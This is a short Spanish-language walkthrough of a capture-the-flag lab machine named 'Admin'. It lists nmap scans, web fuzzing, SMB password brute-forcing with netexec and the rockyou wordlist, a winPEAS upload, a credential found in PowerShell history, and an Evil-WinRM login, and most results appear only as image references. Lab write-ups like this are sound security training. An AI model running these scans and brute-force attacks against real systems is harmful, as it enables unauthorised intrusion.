# Máquina Admin

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 10.0.2.20

![alt text](image-1.png)


### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p80,135,139,445,5040,5985,47001,49664-49670 -vvv -Pn 10.0.2.20

![alt text](image-2.png)


### Fuzzing web

feroxbuster --url http://10.0.2.20/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

No encontré nada interesante

busqué por archivos php y txt

wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/common.txt -z list,php-txt 'http://10.0.2.20/FUZZ.FUZ2Z'

![alt text](image-3.png)

lo visualizo con curl:

![alt text](image-4.png)


### Explotación

Buscamos la contraseña de hope con nxc

sudo netexec smb 10.0.2.20 -u 'hope' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding | grep -v "STATUS_LOGON_FAILURE"

![alt text](image-5.png)

![alt text](image-6.png)

Descargo la herramientas Winpeas64 y la cargo en la máquina víctima 

![alt text](image-7.png)

### Escalar privilegios

Al ejecutar winpeas encuentro un archivo ConsoleHost_history.txt

![alt text](image-8.png)

me conecté por Evil-WinRM

![alt text](image-9.png)

### user.txt

![alt text](image-11.png)

### root.txt

![alt text](image-10.png)